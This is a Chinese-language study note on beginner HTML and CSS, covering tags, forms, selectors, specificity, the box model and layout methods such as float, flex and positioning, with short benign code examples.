# 小米虫爬山路

提示：学习新技术

先看基础视频，了解这个技术是什么有什么用基本的使用写法。

再看文档加深理解。

## 一、CSS、HTML

### CSS和HTML的结构图

![image-20230701175709296](./img/小米虫爬山路-img/image-20230701175709296.png)

### 1、HTML

#### 1.1 HTML是什么？

首先来说HTML，HTML中文称为**超文本标记语言**，**从语义上来说，它只是一种是一种标识性的语言，并不是一种编程语言。**

HTML文件本质上是文本文件，而普通的文本文件只能显示字符。但是HTML技术则通过HTML标签把其他网页、图片、音频、视频等各种多媒体资源引入到当前网页中，让网页有了非常丰富的呈现方式，这就是超文本的含义——**==本身是文本，但是呈现出来的最终效果超越了文本==**。

HTML主要分为HTML4版本和HTML5版本，它们之间有不同的声明方式

HTML ⽹⻚⽂件可以使⽤记事本、写字板、HBuilder、Sublime 等编辑⼯具来编写（主流使用vscode），以 .htm 或 .html 为⽂件后缀名保存。将 HTML ⽹⻚⽂件⽤浏览器打开显示，若测试没有问题则可以放到服务器（Server）上，对外发布信息。

#### 1.2 标记语言

说HTML是一种『==标记语言==』是因为它不是向Java这样的『==编程语言==』，因为它是由一系列『==标签==』组成的，没有常量、变量、流程控制、异常处理、IO等等这些功能。HTML很简单，每个标签都有它固定的含义和确定的页面显示效果。

标签是通过==一组尖括号+标签名的方式来定义的==：

```html
<title>Title</title>
```

这个例子中使用了一个**p标签**来定义一个段落，< title >叫 **『开始标签』** ，< /title >叫 **『结束标签』** 。开始标签和结束标签一起构成了一个完整的标签。开始标签和结束标签之间的部分叫 『文本标签体』，也简称 『标签体』。

有的时候标签里还带有 **『属性』**：

```html
<a href="http://www.baidu.com">百度</a>
<!-- href是 『属性名』，"http://www.baidu.com"是 『属性值』 -->
```

还有一种标签是 **『单标签』**：

```html
<input type="text" name="username" />
```

#### 1.3 HTML文件结构（骨架）

##### 1、文档类型声明

HTML4版本的文档类型声明是：

```html
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
```

HTML5版本的文档类型声明是：

```html
<!DOCTYPE html>
```

但现在主流的技术选型都是使用HTML5，之前的版本基本不用了。

##### 2、根标签

html标签是整个文档的根标签，所有==其他标签都必须放在html标签里面==。上面的文档类型不能当做普通标签看待。

如下：

```html
<html>
</html>
```

##### 3、头部标签

head标签用于定义文档的头部，其他头部元素都放在head标签里。头部元素包括**title**标签、**script**标签、**style**标签、**link**标签、**meta**标签等等。

如下：

```html
<head>
</head>
```

##### 4、主体标签

body标签定义网页的主体内容，在浏览器窗口内显示的内容都定义到body标签内。

如下：

```html
<body>
</body>
```

##### 5、注解

```html
<!-- 注释内容 -->
```

注释的内容不会显示到浏览器窗口内，**是开发人员用来对代码内容进行解释说明**。

正确的HTML的骨架如下:

```html
<!DOCTYPE html>
<!--声明文件类型告诉浏览器怎么编译-->
<html lang="en">
<!-- 跟标签 语言属性 “zn-cn”为中文 “en”为英文 -->
<head>
<!-- 头标签 -->
    <meta charset="UTF-8">
    <!--
	meta标签用来设置网页的一些元数据，比如网页的字符集，关键字、简介
    常见的字符编码有：gb2312、gbk、unicode、utf-8。-->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <!-- 
     viewport 表示设备的屏幕
     width属性控制设备的宽度
	 width=device-width 可以确保它能正确呈现在不同设备上。
     initial-scale=1.0 表示网页加载时，以 1:1 的比例呈现，不会有任何的缩放。-->
    <title>Document</title>
    <!-- 网页标题 -->
</head>
<body>
    <!--body标签用来设置网页的主体内容，即网页中显示的内容在此标签中编写-->
</body>
</html>
```

#### 1.4 HTML语法规则

- 根标签有且只能有一个
- 无论是双标签还是单标签都必须正确关闭
- 标签可以嵌套但不能交叉嵌套
- 注释不能嵌套
- 属性必须有值，值必须加引号，单引号或双引号均可
- 标签名不区分大小写但建议使用小写

#### 1.5 路径

在我们整个Web开发技术体系中，『路径』是一个贯穿始终的重要概念。凡是需要获取另外一个资源的时候都需要用到路径。

- 相对路径（常用）
- 绝对路径

##### 1、相对路径

**相对路径都是以『当前位置』为基准**来编写的。假设我们现在正在浏览a页面，想在a页面内通过超链接跳转到z页面。

![image-20230701183816185](./img/小米虫爬山路-img/image-20230701183816185.png)

所以整个路径的写法是：

```html
<a href="../../e/f/z.html">To z.html</a>
<!-- 在文件路径中./表示当前文件夹 ../表示上一个文件夹 想要表示上上个文件夹用两个../来表示  -->
```

一般我们把文件资源和.html文件放在一起打包好。

##### 2、绝对路径

拿前面相对路径中的例子来说，我们想在a.html页面中通过超链接访问z.html。此时路径从正斜线开始，和a.html自身所在位置没有任何关系：

![image-20230701190625889](./img/小米虫爬山路-img/image-20230701190625889.png)

```html
<!-- 文件资源在D盘中 -->
<a href="D:\d\e\f\z.html">To z.html</a>
<!-- 这是本地路径的资源获取，远程路径 http://ip:端口/项目/文件>
```



#### 1.6 常用标签

|         标签         |                      功能                      |
| :------------------: | :--------------------------------------------: |
|        h1~h6         |                1级标题~6级标题                 |
|          hr          |                     水平线                     |
|          p           |                      段落                      |
|          br          |                      换行                      |
|          a           |                     超链接                     |
|        ol/li         |                    有序列表                    |
|        ul/li         |                    无序列表                    |
|         img          |                      图片                      |
|         div          |             定义一个前后有换行的块             |
|         span         |             定义一个前后无换行的块             |
| b、i、u、s、sub、sup | 加粗、斜体、下划线、删除线、下标文本、上标文本 |

##### 1、标题

h1~h6表示6级标题，每一级大小不同。代码如下：

```html
 <h1>这是一级标题</h1>
 <h2>这是二级标题</h2>
 <h3>这是三级标题</h3>
 <h4>这是四级标题</h4>
 <h5>这是五级标题</h5>
 <h6>这是六级标题</h6>
```

##### 2、水平线

hr 标签在 HTML ⻚⾯中创建⼀条⽔平线（horizontal rule）可以在视觉上将⽂档分隔成各个部分。在HTML 中，hr 标签没有结束标签。代码如下：

```html
<hr />
```

##### 3、段落

用<p></p>表示

```html
<p>文本内容</p>
```

#####  4、换行

br标签为换⾏符号 br 标签是空标签（意味着它没有结束标签，因此这是错误的：`<br></br>`）。
**注意：br 标签只是简单地开始新的⼀⾏，⽽当浏览器遇到 p 标签时，通常会在相邻的段落之间插⼊⼀些垂直的间距。请使⽤br 来输⼊空⾏，⽽不是分割段落。**代码如下：

```html
<br/>
```

##### 5、超链接

a标签定义超链接，⽤于从⼀张⻚⾯链接到另⼀张⻚⾯。


a元素最重要的属性是 href 属性，它指示要链接的⽬标位置，同时没有href属性a标签内的内容与普通⽂本没有区别，也就失去了超链接的功能。

若是想要跳转到当前⻚⾯，那么href的值为#。被链接⻚⾯通常显示在当前浏览器窗⼝中，除⾮您规定了另⼀个⽬标（target 属性）。

```html
<a href="http://www.baidu.com">百度</a>
```

a标签有两个很重要的属性href和target。href表示打开的链接，target表示在那里打开值为blank、parent、self、parent、top

##### 6、有序列表、无序列表

有序列表使用ol/il表示，无序列表ul/li表示代码如下

```html
<ol>
        <li>A</li>
        <li>B</li>
        <li>C</li>
    </ol>
<!--无序-->
<ul>
        <li>A</li>
        <li>B</li>
        <li>C</li>
    </ul>
```

注意：<ol></ol>和<ul></ul>中只能放<li></li>标签，而<li></li>可以放让任何标签

##### 7、图片

img元素向⽹⻚中嵌⼊⼀幅图像。代码如下：

```html
<img src="" alt="" >
```

除了图片以为还有音频<audio></audio>和视频<video></video>都和图片的

##### 8、块

**块**并不是为了显示文章内容的，而是为了方便结合**CSS对页面进行布局**。块有两种，**div是前后有换行的块**，**span是前后没有换行的块**。代码如下：

```html
<div style="border: 1px solid black;width: 100px;height: 100px;">这是div块</div>
<div style="border: 1px solid black;width: 100px;height: 100px;">这是div块</div>

<span style="border: 1px solid black;width: 100px;height: 100px;">这是span块</span>
<span style="border: 1px solid black;width: 100px;height: 100px;">这是span块</span>
```

#### 1.7 表格标签

- **table** 标签定义 HTML表格。
- **tr** 标签定义表格的⾏。tr元素包含⼀个或多个th或td元素
- **td** 标签定义 HTML 表格中的标准单元格。
- **th** 定义表格内的表头单元格。th元素内部的⽂本通常会呈现为居中的粗体⽂本，⽽ td 元素内的⽂本通常是左对⻬的普通⽂本。

简单的的HTML表格由table元素以及⼀个或多个tr、th、或td元素组成。

理解：table相当于⼀个表格的外框，tr为⾏，td为⼀个⼀个单元格，th为有标题作⽤的单元格，th中的内容同时有加粗的效果。代码如下：

```html
<table border="1" width="600" cellspacing="0" cellpadding="4">
			<tr align="center">
				<th>1</th>
				<th>2</th>
				<th>3</th>
				<th>4</th>
			</tr>
</table>
<!-- border表示规定表格边框的宽度 cellspacing表示单元格间距 cellpadding表示单元格填充-->
```

#### 	1.8 表单标签

在项目开发过程中，凡是需要用户填写的信息都需要用到表单。

##### 1、form标签

form 标签⽤于为⽤户输⼊创建 HTML 表单。表单能够包含 input 元素，⽐如⽂本字段、复选框、单选框、提交按钮等等。还可以包含 textarea等元素。

```html
<form action="/aaa/bbb/ccc/test01.html" method="post">
    <!--里面放表单的其他元素-->
</form>
```

表单中有两个重要的**属性action和method**，**action表示**用户在表单输入的信息后传入服务端能接受信息的地址；**method表示**传输的方式，不同浏览器和不同服务器传输的数据是不同的所以就要用method来规定传输的方式，值有get和post，一般用post

##### 2、name和value

在用户使用一个软件系统时，需要一次性提交很多数据是非常正常的现象。我们肯定不能要求用户一个数据一个数据的提交，而肯定是所有数据填好后一起提交。那就带来一个问题，服务器怎么从众多数据中识别出来收货人、所在地区、详细地址、手机号码等信息……？

给每个数据都起一个『**名字**』 ，发送数据时用 『名字』 携带对应的数据，接收数据时通过 『名字』 获取对应的数据。

在各个具体的表单标签中，我们通过 『**name属性**』 来给数据起 『名字』 ，通过 『**value属性**』 来保存要发送给服务器的 『值』 。

但是名字和值之间既有可能是 『一个名字对应一个值』 ，也有可能是 『一个名字对应多个值』。

这么看来这样的关系很像我们Java中的Map，而事实上在服务器端就是使用Map类型来接收请求参数的。具体的类型是：**Map<String,String[]>**

**name属性就是Map的键，value属性就是Map的值。**

##### 3、input标签

input 标签⽤于搜集⽤户信息。

根据不同的 type 属性值，输⼊字段拥有很多种形式。输⼊字段可以是⽂本字段、复选框、单选按钮、按钮等等。

常见属性

|   属性    |                              值                              |                             描述                             |
| :-------: | :----------------------------------------------------------: | :----------------------------------------------------------: |
|    alt    |                             text                             |                   定义图像输⼊的替代⽂本。                   |
|  checked  |                           checked                            |           规定此 input 元素⾸次加载时应当被选中。            |
| disabled  |                           disabled                           |                当 input 元素加载时禁⽤此元素                 |
| readonly  |                           readonly                           |                     规定输⼊字段为只读。                     |
| maxlength |                            number                            |               规定输⼊字段中的字符的最⼤⻓度。               |
|   value   |                            value                             |                    规定 input 元素的值。                     |
|   type    | button、checkbox、file、hidden、image、password、radio、reset、submit、text | 规定 input 元素的类型。按钮、复选框、⽂件、隐藏域、图像形按钮、密码、单选框、重置、提交按钮、⽂本 |

 注意：

1. 没有==name属性的元素==是⽆法提交到后台的！！！！
2. Radio单选按钮以name相同为⼀组。
3. Checkbox复选按钮以name相同为⼀组。

##### 4、textarea标签

该标签定义多⾏的⽂本输⼊控件。⽂本区中可容纳⽆限数量的⽂本，可以通过 cols 和 rows 属性来规定 textarea 的尺⼨。cols规定⽂本区内的可⻅宽度。rows规定⽂本区内的可⻅⾏数。

```html
<textarea name="text">content</textarea>
```

##### 5、label标签

- label 标签为input 元素定义标注（标记）。
- label元素不会呈现任何的特殊效果。
- label标签的for属性应当与相关元素的id属性相同，此时点击label标签会⾃动为元素聚焦

```html
<label for="username">⽤户名：</label>
<input type="text" id="username" name="username"/>
```

##### 6、select标签

select⽤于定义下拉列表

- 下拉列表用到了两种标签，其中select标签用来定义下拉列表，而option标签设置列表项。
- name属性在select标签中设置。
- value属性在option标签中设置。
- option标签的标签体是显示出来给用户看的，提交到服务器的是value属性的值。
- 通过在option标签中设置selected="selected"属性实现默认选中的效果。

```html
<select name="color" >
 <option value="red">红⾊</option>
 <option value="green">绿⾊</option>
 <option value="blue" selected="selected">蓝⾊</option>
</select>
```

select常用属性

| 属性     | 值       | 描述                           |
| -------- | -------- | ------------------------------ |
| disabled | disabled | 禁⽤该下拉框。                 |
| multiple | multiple | 规定可选择多个选项。           |
| name     | name     | 规定下拉列表的名称。           |
| size     | number   | 规定下拉列表中可⻅选项的数⽬。 |

option常用属性

| 属性     | 值       | 描述                                             |
| -------- | -------- | ------------------------------------------------ |
| disabled | disabled | 禁⽤该下拉框。                                   |
| selected | selected | 规定选项（在⾸次显示在列表中时）表现为选中状态。 |
| value    | text     | 定义送往服务器的选项值。                         |

##### 7、button标签

```html
<button type="button">普通按钮</button>   <!--点击后无效果，需要通过JavaScript绑定单击响应函数-->
<button type="reset">重置按钮</button>    <!--点击后将表单内的所有表单项都恢复为默认值-->
<button type="submit">提交按钮</button>   <!--点击后提交表单-->
```

| 属性     | 值                    | 描述               |
| -------- | --------------------- | ------------------ |
| disabled | disabled              | 禁⽤该按钮。       |
| type     | button、submit、reset | 规定按钮的类型。   |
| value    | text                  | 规定按钮的初始值。 |
| name     | button_name           | 规定按钮的名称。   |



### 2 、CSS

#### 2.1 什么是CSS

CSS（英⽂全称：Cascading Style Sheets）层叠样式表, 是⼀种⽤来表现HTML（标准通⽤标记语⾔的⼀个应⽤）或XML（标准通⽤标记语⾔的⼀个⼦集）等⽂件样式的计算机语⾔。

CSS⽬前最新版本为CSS3，是能够真正做到⽹⻚表现与内容分离的⼀种样式设计语⾔。相对于传统HTML的表现⽽⾔，CSS能够对⽹⻚中的对象的位置排版进⾏像素级的精确控制，⽀持⼏乎所有的字体字号样式，拥有对⽹⻚对象和模型样式编辑的能⼒，并能够进⾏初步交互设计，是⽬前基于⽂本展示最优秀的表现设计语⾔。CSS能够根据不同使⽤者的理解能⼒，简化或者优化写法，针对各类⼈群，有较强的易读性。

==CSS是⽤来美化⽹⻚⽤的，没有⽹⻚则CSS毫⽆⽤处，所以CSS需要依赖HTML展示其功能。==

#### 2.2 CSS语法 

CSS 样式由==选择器==和⼀条或多条以分号隔开的==样式声明==组成。每条声明的样式包含着⼀个 ==CSS属性和属性值==。

```css
选择器名 {
 属性 : 属性值;
 ......
}
/* 如下 */
div {
 background-color : red;
}
/*注意：
css声明要以分号;结束，声明以{}括起来
建议⼀⾏书写⼀个属性
若值为若⼲单词，则要给值加引号，如 font-family: “agency fb”;
*/
```

#### 2.3 CSS使用规则

##### 1、⾏内式

⾏内样式将样式定义在具体html元素的style属性中。以⾏内式写的CSS耦合度⾼，只适⽤于当前元素，在设定某个元素的样式时⽐较常⽤。

```css
<p style="color:red;font-size:50px;">这是⼀段⽂本</p>
```

在当前元素使⽤ style 属性的声明⽅式。

style 是⾏内样式属性；

color 是颜⾊属性；red 是颜⾊属性值；

font-size是字体⼤⼩属性；50px 是字体⼤⼩属性值

##### 2、嵌⼊式

嵌⼊式通过在html⻚⾯**内容开辟⼀段属于css的代码区域**，通常做法为在 head 标签中**嵌套 style标签**，在 style 中**通过选择器的⽅式调⽤指定的元素并设置相关 CSS**。

```css
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        div {
            border: 1px solid black;
            width: 100px;
            height: 100px;
            background-color: lightgreen;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <div style="border: 1px solid black;width: 100px; height: 100px;">&nbsp;</div>
    <div ></div>
    <div ></div>
    <div ></div>
</body>
```

##### 3、引⼊外联样式⽂件

在实际开发当中，很多时候都使⽤引⼊外联样式⽂件，这种形式可以使html⻚⾯更加清晰，⽽且可以达到更好的重⽤效果。
如有一个文件style.css内容如下：

```css
p {
 color: green;
 font-size: 30px;
}
```

就可以在要使用这个CSS文件的HTML的head标签内加入

```html
<link rel="stylesheet" type="text/css" href="style.css">
<!--
rel:rel 属性规定当前⽂档与被链接⽂档之间的关系。
stylesheet:⽂档的外部样式表。
很多时候，⼤量的 HTML ⻚⾯使⽤了同⼀个CSS。那么就可以将这些 CSS 样式保存在⼀个单独的.css ⽂件中，然后通过 link 元素去引⼊它。
-->
```

**注意：当有多重样式时，记住前提规则，越精确越优先。**

#### 2.3 CSS选择器&高级选择器

在 CSS 中，选择器是⼀种模式，⽤于选择需要添加样式的元素。CSS选择器有很多，掌握常⽤的即可；

##### 1、通⽤选择器

选择所有 *，即html中所有元素都会实现css中的属性设置。

```css
* {
 ......
}

* {
 color: orange;
}
```

##### 2、标签选择器

选择指定标签，通过标签为名字的选择器，==选中所有的相同的标签==

```css
元素名称 {
 ......
}

p {
 color: red;
 font-size: 20px;
}
```

##### 3、id选择器

选择设置过指定id属性值的元素 #，通过标签的id值来进行属性设置，**主要用于配合js找标签使用**

```css
#id属性值 {
 ......
}

#one {
    font-size: 20px;
    background-color: lightgreen;
}

```

在html中代码如下

```html
<p id="one">Hello, this is a p tag.</p>
<p>Hello, this is a p tag.</p>
```

==注意：每个标签都有id，但是唯一即只能有一个值，且一个id选择器选中后就不能选择其他的标签了，因为id选择器本身不是用来做美化工作的而是配合js使用的。==

##### 4、类选择器

选择设置过指定class属性值的元素 ，和id选择器相似。

```css
.class属性值 {
 ......
}

.two {
    border: 1px solid black;
    width: 100px;
    height: 100px;
    background-color: yellow;
    margin-top: 5px;
}


```

在html中代码如下

```html
<div class="two">&nbsp;</div>
<div class="two">&nbsp;</div>
<div class="two">&nbsp;</div>
```

==注意：一个标签可以被多个类选择器选择，而一个类选择器也可以选择多个标签==

##### 5、分组选择器

当⼏个元素样式属性⼀样时，可以共同调⽤⼀个声明，元素之间⽤逗号分隔

```css
选择器1,选择器2,... {
 ......
}

h2 , #pre1 {
 color: orange;
 font-style: italic;
}
/*CSS样式的优先级，是根据选择器的精确度/权重来决定的，常⻅的权重如下，权重越⼤，优先级越⾼
元素选择器：1
类选择器：10
id选择器：100
内联样式：1000*/
```

##### 6、后代选择器

作用：根据HMTL标签的嵌套关系，选择父元素后代中满足条件的元素

语法：==选择器1 选择器2{css}==

特点：在选择器1所找到标签的后代(儿子、孙子、重孙子..）中，找到满足选择器2的标签，设置样式

解释：**标签后代就是在一个标签中嵌套另一个标签。**

注意：选择器1和选择器2可以是类选择器、标签选择器等

代码如下:

html

 ```html
 <p>这是一个p标签</p>
 <div>
     <p>
         这是div的儿子标签
     </p>
 </div>
 ```

css

```css
div p{
    color:red;
}
```

##### 7、子代选择器

作用:根据HTML标签的嵌套关系，选择父元素子代中满足条件的元素

语法：选择器1>选择器2{css}

特点：在选择器1所找到标签的子代(儿子)中，找到满足选择器2的标签，设置样式

区别后代选择器：==子代选择器只能选择子代（儿子）==

html代码如下：

```html
 <div class="one">
        <a href="#">这是儿子</a>
        <p>这是儿子
            <a href="#">这是孙子
            </a>
        </p>
    </div>
```

css代码如下：

```css
.one>a{
            color: red;
            text-decoration:none;
        }
```

##### 8、并集选择器

作用:同时选择多组标签，设置相同的样式

语法：选择器1 ，选择器2{ css }

==特点：找到选择器1和选择器2选中的标签，设置样式==

代码省略

##### 9、交集选择器

作用:选中页面中同时满足多个选择器的标签

语法:选择器1选择器2{ css }（==中间什么都没有==）

特点： (既又原则）找到页面中既能被选择器1选中，又能被选择器2选中的标签，设置样式

代码省略

##### 10、hover伪类选择器

作用:选中鼠标悬停在元素上的状态，设置样式

语法：选择器：hover{css}

特点：==鼠标悬停时就会出现样式==

代码省略

##### 11、结构伪类选择器E:nth-child(n)、E:nth-of-type(n)

目标：能够使用结构伪类选择器在HTML中定位元素

作用与优势：

1作用:根据元素在HTML中的结构关系查找元素

2 优势:减少对于HTML中类的依赖，有利于保持代码整洁

3场景:常用于查找某父级选择器中的子元素

**:nth-child选择器**

**描述：选择父元素下的第n个子元素，并且这第n个子元素的类型为E,**

| 选择器                | 说明                                     |
| --------------------- | ---------------------------------------- |
| E:first-child{}       | 匹配父元素的第一个子元素，并且是E元素    |
| E:last-child{}        | 匹配父元素中最后一个子元素，并且是E元素  |
| E:nth-child(){}       | 匹配父元素中第n个子元素，并且是E元素     |
| E:nth-last-child(n){} | 匹配父元素中倒数第n个子元素，并且是E元素 |

**:nth-of-type选择器**

描述：选择父元素中的E类型的元素，且是第n个。

用法与:nth-child相似

==区别：E:nth-of-type(n) 是先去找到父元素中子元素类型为E的，然后把它们单独拿出来进行排序，顺着数数为n的那个子元素就是我们筛选出来的,对子子元素也是一样的操作。而E:nth-child(n)是现在再到第n个元素然后再判断是否是E型，不是就再子子元素找最后找完；==

##### 12、伪元素选择器

伪元素：一般页面中的非主体内容可以使用伪元素，即并没有在html中写出的标签而是通过css写出的标签。

区别：

元素：HTML设置的标签

伪元素：有CSS模拟出来的标签效果

种类

|  伪元素  |              作用              |
| :------: | :----------------------------: |
| ::before | 在元素内容的前面添加一个伪元素 |
| ::after  | 在元素内容的后面添加一个伪元素 |

==注意点:必须设置content属性才能生效，伪元素默认是行内元素==

#### 2.4 CSS属性

##### 1、背景

**背景颜⾊：background-color**

作用：设置元素的背景颜⾊

```css
background-color:red;
```

**背景图片：background-image**

属性值：background-image：url('图片路径'）;

作用：设置元素的背景图像，默认情况下，背景图像进⾏平铺重复显示，以覆盖整个元素实体。

```css
background-image:url('paper.gif');
```

**背景平铺：background-repeat**

属性值：repeat(平铺)、no-repeat(不平铺)、repeat-x(沿着x轴平铺)、repeat-y(沿着y轴平铺)

作用：设置背景图的平铺问题

**背景图位置：background-position**

属性值：background-position：水平位置 竖着位置

![image-20230703111654317](./img/小米虫爬山路-img/image-20230703111654317.png)

作用：设置背景图的位置

背景图与img的区别

img：不能设置位置一般用于放重要的图片

背景图：可以设置图片的位置一般用于放不重要的图

**背景图覆盖：background-size**

属性值：auto（背景图不变）、contain（背景按比例改变）、’length‘（使用特定的长度来设置背景图大小）、‘percentage’（使用百分比来设置背景图尺寸）、cover（背景图按比例改变）

contain和cover的区别是：contain==背景图片不会超出背景区域==。如果背景区域的宽高比与背景图片的宽高比不同，背景图片可能会在水平或垂直方向上留有空白。cover背景图片将被调整大小以填充整个背景区域，并保持其宽高比例不变。==背景图片可能会被裁剪，以确保它覆盖整个背景区域，同时保持其纵横比==。

##### 2、文本

**文本颜色：color**

作用：设置文字的颜色

```css
color:blue;
color:#00ff00;
color:rgb(255,0,0);
```

**文本对齐：text-align**

作用：设置⽂本对⻬⽅式，center（居中），left（左对⻬），right（右对⻬）, justify(两端对齐)

```css
text-align:center;
text-align:right;
text-align:right;
```

注意：值 可以使⽂本的两端都对⻬。在两端对⻬⽂本中，⽂本⾏的左右两端都放在⽗元素的内边界上。然后，调整单词和字⺟间的间隔，使各⾏的⻓度恰好相等。对最后⼀⾏不⽣效。

**文本修饰：text-decoration**

作用：规定添加到⽂本的修饰，属性值：none、underline、overline、line-through

解释：

1）underline
对⽂本添加下划线，与HTML的u元素相同。

2）overline
对⽂本添加上划线。

3）line-through
对⽂本添加中划线，与HTML中的s和 strike 元素相同。

4）none
关闭原本应⽤到元素上的所有装饰。

```css
text-decoration:underline;
```

**文本缩进：text-indent**

作用：设置⽂本⾸⾏缩进，属性值为：px（像素）、em（相对值）

```css
text-indent: 2em;
```

==注意：em⼀个相对值，一个em值就是文本中一个字的大小==

**文本行高：line-height**

作用：设置文本行与行之间的间距，属性值：px、倍数（当前font-size的倍数）

```css
line-height:10px;
line-height:1.5;
```

##### 3、字体

**字体样式：font-family**

作用：⽂本字体，该属性设置⽂本的字体。

==注意：font-family属性应该设置⼏个字体名称作为⼀种"后备"机制，如果浏览器不⽀持第⼀种字体，他将尝试下⼀种字体，所以尽量将不常⻅的字体靠前，将最常⻅的字体放置在最后，作为替补。==

```css
font-family: "arial black";
/* 靠前的字体先⽣效 */
font-family: 微软雅⿊,⿊体,"agency fb";
```

**字体大小：font-size**

作用：设置字体大小

```css
font-size: 50px; /*字体⼤⼩50px*/
font-size: 25px; /*字体⼤⼩25px*/
```

**字体风格：font-style**

作用：字体⻛格，该属性最常⽤于规定斜体⽂本。 属性值：normal、italic、oblique

说明：

1）normal：⽂本正常显示；

2）italic：⽂本斜体显示；

3）oblique：⽂本倾斜显示，oblique是将⽂字强制倾斜。

注意：⼀般情况下，字体有粗体、斜体、下划线、删除线等诸多属性，但是不是所有字体都具有这些属性，⼀些不常⽤字体可能只有正常体，**若使⽤italic属性则没有效果，所以需要oblique属性强制倾斜**。

```css
font-style:normal;
font-style:italic;
```

**字体粗细：font-weight**

作用：字体加粗或变细，该属性设置⽂本的粗细。属性值：bold（加粗）、100 ~ 900（为字体指定了 9 级加粗度。如果⼀个字体内置了这些加粗级别，那么这些数字就直接映射到预定义的级别）

```css
font-weight:bold;
```

##### 4、display属性

display 属性规定元素应该⽣成的框的类型。这个属性⽤于定义建⽴布局时元素⽣成的显示框类型。

| 属性值       | 描述                                                 |
| ------------ | ---------------------------------------------------- |
| none         | 此元素不会被显示。                                   |
| block        | 此元素将显示为块级元素，此元素前后会带有换行符。     |
| inline       | 默认。此元素会被显示为内联元素，元素前后没有换行符。 |
| inline-block | 行内块元素。(CSS2.1新增的值)                         |
| list-item    | 此元素会作为列表显示。                               |
| flex         | 弹性布局，它能够扩展和收缩 flex 容器内的元素         |

##### 5、浮动

float的属性值有none、left、right。

特点

1. 只有横向浮动，并没有纵向浮动。
2. 会将元素的display属性变更为block。
3. 浮动元素的后⼀个元素会围绕着浮动元素（典型运⽤是⽂字围绕图⽚）
4. 浮动元素的前⼀个元素不会受到任何影响（如果你想让两个块状元素并排显示，必须让两个块状元素都应⽤float）。

##### 6、盒⼦模型

border、padding、margin三个属性构成了盒⼦模型。

![image-20230702220957732](./img/小米虫爬山路-img/image-20230702220957732.png)

###### border

设置所有的边框属性。宽度、样式、颜⾊

```css
border-width
border-style
border-color
```

###### padding

设置元素所有内边距的宽度，或者设置各边上内边距的宽度。

单独设置各边的内边距：padding-top、padding-left、padding-bottom、padding-right

```css
padding: 1.5cm
padding: 0.5cm 2.5cm 2.5cm 2.5cm
```

注意：通过padding属性设置元素内边距时，会使元素变形。若不想影响格式效果，可以⽤margin属性设置元素外边距。

###### margin

设置⼀个元素所有外边距的宽度，或者设置各边上外边距的宽度。

单独设置各边的外边距：margin-top、margin-left、margin-bottom、margin-right

```css
margin-top:100px;
margin-bottom:100px;
margin-right:50px;
margin-left:50px;
margin: auto auto;
margin: 100px auto;
```

说明：

auto：⾃动，可以理解为居中的意思。浏览器⾃动计算外边距。

margin: auto auto：第⼀个auto表示上下外边距⾃动计算，第⼆个auto表示左右外边距⾃动算。但是上下外边距在⾃动计算时不会⽣效，⽽左右外边距会⽣效，表现为居中状态，效果如下：

![image-20230702235908212](./img/小米虫爬山路-img/image-20230702235908212.png)

若要设置为上下左右居中状态，则要自行计算好上下的外边距，效果如下：

![image-20230702235936743](./img/小米虫爬山路-img/image-20230702235936743.png)

==注意：如果未设置 `width` 属性（或将其设置为 100％），则居中对齐无效。==

##### 7、元素显示模式转换

目的：改变元素默认的显示特点，让元素符合布局要求

语法：display：属性值

block：块级

inline-block：行内块级

inline：行内级

flex：弹性盒

弹性盒子特点：弹性盒子可以**批量式**的改变**子元素**的布局！

什么时候使用弹性盒子：

1.当一个盒子里的子元素需要垂直居中一个块的内容

2.当盒子里所有的子元素占用等量的可用宽度/高度时

3.当多列布局中都需要相同的高度(不用理会内容)

#### 2.5 CSS特性

##### 1、继承性

特性:子元素有默认继承父元素样式的特点（子承父业)可以继承的常见属性(==文字控制属性都可以继承==)

##### 2、层叠性

特性：

1．给同一个标签设置不同的样式→此时样式会层叠叠加→会共同作用在标签上

2．给同一个标签设置相同的样式→此时样式会层叠覆盖→最终写在最后的样式会生效

##### 3、优先级

==解释：如果一个标签选择了多个选择器，样式冲突了会按照优先级来选择==

特性：不向选择器具有不同的优先级，优先级高的选择器样式会覆盖优先级低选择器样式

优先级：继承<通配符选择器<标签选择器<类选择器<id选择器<行内样式<!important

#### 2.6 布局方式

##### 1、标准流

标准流:又称**文档流**，是浏览器在渲染显示网页内容时默认采用的一套排版规则，规定了应该以何种方式排列元素，即按照标签默认的布局规则布局。

常见标准流排版规则:

1、块级元素:从上往下，**垂直布局**，独占一行

2、行内元素或行内块元素:从左往右，**水平布局**，空间不够自动折行

##### 2、浮动布局

 浮动布局：可以让两个元素之间没有间隔的放在一起

float的属性值有none、left、right。

特点：

1、会脱离标准流的控制，在标准流中不占位置

2、浮动元素比标准流高半个级别，可以覆盖标准流中的**元素**

3、浮动找浮动，下一个浮动元素会在上一个浮动元素后面左右浮动

4、浮动元素有特殊的显示效果，一行可以显示多个，可以设置宽高

##### 3、弹性布局

弹性布局：对父元素使用属性display：flex把它变成弹性盒子，里面的子元素就会弹性布局，默认让子节点横向排列，通过更改属性来实现对块的不同布局

##### 4、定位布局

定位布局：通过使用定位属性来精确控制元素在页面中的位置。通过设置元素的 `position` 属性为 `relative`、`absolute`、`fixed` 或 `sticky`，配合使用 `top`、`bottom`、`left` 和 `right` 属性，可以将元素定位在页面中的特定位置。

**相对定位（Relative Positioning）**：通过设置 `position: relative;`，可以相对于元素在正常文档流中的原来位置进行定位。然后使用 `top`、`bottom`、`left` 和 `right` 属性来进行位置的微调。

**绝对定位（Absolute Positioning）**：通过设置 `position: absolute;`，可以将元素从正常文档流中脱离，并相对于最近的已定位父元素或整个文档进行定位。使用 `top`、`bottom`、`left` 和 `right` 属性来精确定位元素。

**固定定位（Fixed Positioning）**：通过设置 `position: fixed;`，可以将元素相对于浏览器窗口进行定位。无论页面如何滚动，元素都会保持在固定的位置。同样，使用 `top`、`bottom`、`left` 和 `right` 属性来指定元素的位置。

**粘性定位（Sticky Positioning）**：通过设置 `position: sticky;`，可以使元素在滚动到特定位置时变为固定定位，超过该位置后又恢复到相对定位。这使得元素在页面滚动时可以保持在屏幕内的特定位置。使用 `top`、`bottom`、`left` 和 `right` 属性来定义元素在黏性定位过程中的行为。

#### 2.7、自定义属性

